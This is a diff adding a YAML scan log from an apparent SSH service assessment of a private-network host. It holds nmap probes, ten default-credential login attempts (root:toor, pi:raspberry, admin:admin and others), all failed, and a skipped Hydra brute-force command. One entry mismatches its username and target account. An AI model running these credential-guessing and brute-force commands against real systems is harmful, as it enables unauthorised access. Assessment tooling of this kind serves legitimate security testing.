@@ -1,0 +1,198 @@
+schema: servicescan/1.0
+service: ssh
+port: '22'
+host: 192.168.220.57
+hostname: ''
+domain: ''
+version: ''
+scan_date: '2026-06-04T12:05:42+00:00'
+scans:
+  information_gathering:
+  - name: Nmap Version Detection
+    command: sudo nmap --host-timeout 60s 192.168.220.57 -p 22 -Pn -sV --script=ssh-hostkey
+    exit_code: 0
+    stdout: "Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-04 07:05 CDT\n\
+      Nmap scan report for 192.168.220.57\nHost is up (0.049s latency).\n\nPORT  \
+      \ STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)\n|\
+      \ ssh-hostkey: \n|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)\n\
+      |   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)\n|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86\
+      \ (ED25519)\n\nService detection performed. Please report any incorrect results\
+      \ at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned\
+      \ in 1.85 seconds\n"
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+  - name: Auth Methods Check
+    command: sudo nmap -sV --host-timeout 60s 192.168.220.57 -p 22 -Pn --script=ssh-auth-methods
+      --script-args="ssh.user=root"
+    exit_code: 0
+    stdout: "Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-04 07:05 CDT\n\
+      Nmap scan report for 192.168.220.57\nHost is up (0.050s latency).\n\nPORT  \
+      \ STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)\n|\
+      \ ssh-auth-methods: \n|   Supported authentication methods: \n|     publickey\n\
+      |     gssapi-keyex\n|     gssapi-with-mic\n|_    password\n\nService detection\
+      \ performed. Please report any incorrect results at https://nmap.org/submit/\
+      \ .\nNmap done: 1 IP address (1 host up) scanned in 0.63 seconds\n"
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+  misconfiguration_checks:
+  - name: Password Auth Confirmation
+    command: ssh -p 22 -o StrictHostKeyChecking=no -o PreferredAuthentications=none
+      -o BatchMode=yes root@192.168.220.57 2>&1
+    exit_code: 255
+    stdout: 'Warning: Permanently added ''192.168.220.57'' (ED25519) to the list of
+      known hosts.
+
+      root@192.168.220.57: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
+
+      '
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+  - name: Username Enumeration
+    command: sudo nmap -sV --host-timeout 60s 192.168.220.57 -p 22 --script=ssh-auth-methods
+    exit_code: 0
+    stdout: "Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-04 07:05 CDT\n\
+      Nmap scan report for 192.168.220.57\nHost is up (0.050s latency).\n\nPORT  \
+      \ STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)\n|\
+      \ ssh-auth-methods: \n|   Supported authentication methods: \n|     publickey\n\
+      |     gssapi-keyex\n|     gssapi-with-mic\n|_    password\n\nService detection\
+      \ performed. Please report any incorrect results at https://nmap.org/submit/\
+      \ .\nNmap done: 1 IP address (1 host up) scanned in 0.75 seconds\n"
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+  authentication_testing:
+  - name: Default Credentials root empty
+    command: sshpass -p '' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      -o BatchMode=no root@192.168.220.57 id 2>/dev/null && echo "[+] root:empty worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: root
+    password: ''
+    confirmed: false
+  - name: Default Credentials root root
+    command: sshpass -p 'root' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      -o BatchMode=no root@192.168.220.57 id 2>/dev/null && echo "[+] root:root worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: root
+    password: root
+    confirmed: false
+  - name: Default Credentials root toor
+    command: sshpass -p 'toor' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      -o BatchMode=no root@192.168.220.57 id 2>/dev/null && echo "[+] root:toor worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: root
+    password: toor
+    confirmed: false
+  - name: Default Credentials admin admin
+    command: sshpass -p 'admin' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      -o BatchMode=no admin@192.168.220.57 id 2>/dev/null && echo "[+] admin:admin
+      worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: admin
+    password: admin
+    confirmed: false
+  - name: Default Credentials admin password
+    command: sshpass -p 'password' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      -o BatchMode=no admin@192.168.220.57 id 2>/dev/null && echo "[+] admin:password
+      worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: admin
+    password: password
+    confirmed: false
+  - name: Default Credentials ubuntu ubuntu
+    command: sshpass -p 'ubuntu' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      root@192.168.220.57 id 2>/dev/null && echo "[+] ubuntu:ubuntu worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: ubuntu
+    password: ubuntu
+    confirmed: false
+  - name: Default Credentials pi raspberry
+    command: sshpass -p 'raspberry' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      pi@192.168.220.57 id 2>/dev/null && echo "[+] pi:raspberry worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: pi
+    password: raspberry
+    confirmed: false
+  - name: Default Credentials user user
+    command: sshpass -p 'user' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      user@192.168.220.57 id 2>/dev/null && echo "[+] user:user worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: user
+    password: user
+    confirmed: false
+  - name: Default Credentials vagrant vagrant
+    command: sshpass -p 'vagrant' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      -o BatchMode=no vagrant@192.168.220.57 id 2>/dev/null && echo "[+] vagrant:vagrant
+      worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: vagrant
+    password: vagrant
+    confirmed: false
+  - name: Default Credentials kali kali
+    command: sshpass -p 'kali' ssh -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      -o BatchMode=no kali@192.168.220.57 id 2>/dev/null && echo "[+] kali:kali worked"
+    exit_code: 5
+    stdout: ''
+    stderr: ''
+    skipped: false
+    skip_reason: ''
+    type: authentication
+    username: kali
+    password: kali
+    confirmed: false
+  - name: Hydra SSH Brute Force
+    command: hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P
+      /usr/share/seclists/Passwords/Common-Credentials/best110.txt ssh://192.168.220.57:22
+      -t 16 -f -W 0 > ssh_hydra_192.168.220.57.txt 2>&1
+    exit_code: null
+    stdout: ''
+    stderr: ''
+    skipped: true
+    skip_reason: brute force — use BruteForce script
